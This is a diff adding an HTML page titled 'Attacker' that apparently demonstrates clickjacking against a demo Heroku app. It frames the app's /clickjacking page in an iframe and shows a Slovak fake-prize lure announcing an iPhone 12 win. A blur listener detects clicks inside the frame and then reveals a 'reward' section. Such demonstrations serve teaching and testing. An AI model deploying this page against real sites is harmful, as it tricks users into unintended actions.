@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Attacker</title>
+  <link rel="stylesheet" href="evilPage.css">
+</head>
+
+<body>
+
+  <script>
+    var listener = window.addEventListener('blur', function () {
+      if (document.activeElement === document.getElementById('iframe')) {
+        document.getElementById("reward").style.display = "block";
+      }
+      window.removeEventListener('blur', listener);
+    });
+  </script>
+
+  <div id="message">
+    <h1>GRATULUJEME</h1>
+    <p>Pre pokračovanie kliknite <span id="show">sem</span></p>
+    <!--<br><br><br><br><br><br><br><br>-->
+    <div id="reward">
+      <img src="https://cdn.alza.sk/Foto/f16/RI/RI035c1.jpg" width="275px" />
+      <p class="winMessage">Práve ste vyhrali nový iPhone 12, gratulujeme!</p><br><br><br><br><br><br><br><br><br><br>
+      <input type="button" value="Vyzdvihnúť si odmenu" /><br>
+      <p class="getBack">Vráťte sa späť do <a href="https://infinite-oasis-17402.herokuapp.com/clickjacking"><b>aplikácie</b></a></p>
+    </div>
+  </div>
+
+  <iframe src="https://infinite-oasis-17402.herokuapp.com/clickjacking" id="iframe"></iframe>
+
+</body>
+</html>
